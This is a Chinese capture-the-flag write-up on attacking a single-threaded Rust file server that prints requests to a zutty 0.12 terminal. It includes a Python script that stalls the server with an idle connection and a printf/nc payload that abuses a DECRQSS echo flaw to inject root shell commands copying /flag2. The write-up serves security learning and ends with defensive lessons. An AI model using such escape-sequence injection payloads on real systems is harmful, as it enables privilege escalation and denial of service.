# 动画分享

## 题目简述

题目会先以 root 身份在 `zutty 0.12` 终端模拟器中启动一个 Rust 文件服务器，再降权为 `nobody` 运行选手上传的程序。第一问要让服务器无法通过健康检查，第二问要读取选手权限无法直接访问的 `/flag2`。

Rust 服务器是单线程串行模型：

```rust
for stream in listener.incoming() {
    match stream {
        Ok(stream) => handle_connection(stream),
        Err(e) => eprintln!("Connection failed: {}", e),
    }
}
```

`handle_connection` 会阻塞读取至多 1024 字节，并把 HTTP 请求第一行原样打印到终端。这同时暴露两个原语：一个不发数据的 TCP 连接可阻塞整个服务；未清洗的 ANSI/DEC 控制字符会交给有历史漏洞的 zutty 解析。第二问的决定性障碍是终端输入边界逃逸，而不是 chroot 内的路径穿越。

## 解题过程

### 第一问：占住单线程连接

上传程序需让持有套接字的子进程留在后台，而父进程及时退出，使题目包装器继续执行健康检查：

```python
#!/usr/bin/env python3
import os
import socket
import time

pid = os.fork()
if pid == 0:
    s = socket.create_connection(("127.0.0.1", 8000))
    while True:
        time.sleep(3600)  # 始终不向 fileserver 发送请求数据
else:
    time.sleep(1)
    os._exit(0)
```

fileserver 在第一个连接的 `read` 上永久等待，不会处理健康检查的新连接。包装器的 `health_check()` 超时后判定服务不可用，返回第一个 flag。

### 第二问：利用 DECRQSS 回显注入终端输入

zutty 0.12 对 DECRQSS（DEC Request Selection or Setting）的无效请求处理不正确。终端收到形如 `ESC P $ q ... ESC \` 的请求后，本应对无效参数返回取消；该版本却把攻击者指定的字节回送到伪终端输入侧，等价于模拟 root 用户键盘输入。此问与历史上 CVE-2008-2383 同属终端响应注入问题，zutty 后续版本已改为对无效 DECRQSS 返回 cancel，不再回显攻击数据。

可在上传程序中向本地 8000 端口发送一行特制 HTTP 请求：

```bash
#!/bin/sh
printf 'GET /?\033P$q\003\033\\ \033P$q\rcp /flag2 /dev/shm/flag2\r\033\\ \033P$q\rchmod 644 /dev/shm/flag2\r\033\\ HTTP/1.0\r\n\r\n' \
  | nc 127.0.0.1 8000
sleep 2
cat /dev/shm/flag2
```

关键字节的作用如下：

- `\033P$q ... \033\` 是 DCS/DECRQSS 序列，用于把夹在其中的字节触发成终端输入。
- `\003` 是 Ctrl+C，先终止当前前台的 chroot fileserver，让 root shell 恢复接收命令。
- 后续两段分别复制 `/flag2` 并放宽权限。不能把换行直接放入 HTTP 首行，因此使用 `\r`；TTY 的 `ICRNL` 设置会把回车转成换行并执行命令。

利用成功后，服务器同时因 Ctrl+C 退出，所以这一 payload 也能满足第一问。验证第二问时以低权限程序成功读取 `/dev/shm/flag2` 为准，而不是仅观察 fileserver 退出。

## 方法总结

- 核心技巧：用建立后不发送数据的 TCP 连接阻塞单线程服务；再利用旧版终端的 DECRQSS 回显缺陷，把服务日志中的控制序列变成 root shell 输入。
- 识别信号：网络服务串行处理连接、阻塞读数据，并向特定老版终端原样打印用户可控文本。
- 复用要点：日志输出也是安全边界，应转义 C0/C1 控制字符；chroot 只限制 fileserver 的文件视图，不能防住攻击者反向控制 chroot 外的 root 终端。
